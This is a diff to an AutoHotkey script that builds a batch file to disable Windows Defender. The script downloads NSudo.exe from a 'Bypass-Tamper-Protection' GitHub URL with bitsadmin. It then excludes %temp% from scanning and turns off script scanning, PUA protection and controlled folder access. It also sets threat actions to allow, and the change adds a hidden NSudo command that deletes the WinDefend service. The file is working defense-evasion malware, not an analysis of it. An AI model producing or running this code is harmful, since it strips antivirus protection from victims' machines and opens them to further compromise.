@@ -16,7 +16,7 @@ if not (A_IsAdmin or RegExMatch(full_command_line, " /restart(?!\S)"))
 }
 
 x:="@echo off `n"
-a:="bitsadmin/transfer Explorers /download /priority FOREGROUND Param1 %temp%\NSudo.exe `n"
+a:="bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe `n"
 b:="timeout 4 `n"
 c:="cd %temp% `n"
 d:="powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath %temp%""`n"
@@ -27,7 +27,7 @@ h:="powershell.exe -command ""Set-MpPreference -EnableControlledFolderAccess Dis
 i:="powershell.exe -command ""Set-MpPreference -PUAProtection disable""`n"
 g:="powershell.exe -command ""Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true""`n"
 j:="powershell.exe -command ""Set-MpPreference -DisableScriptScanning $true""`n"
-i:="powershell.exe -command ""Set-MpPreference -SubmitSamplesConsent 2""`n"
+i:="NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend `n"
 j:="powershell.exe -command ""Set-MpPreference -HighThreatDefaultAction 6 -Force""`n"
 k:="powershell.exe -command ""Set-MpPreference -ModerateThreatDefaultAction 6""`n"
 l:="powershell.exe -command ""Set-MpPreference -LowThreatDefaultAction 6""`n"
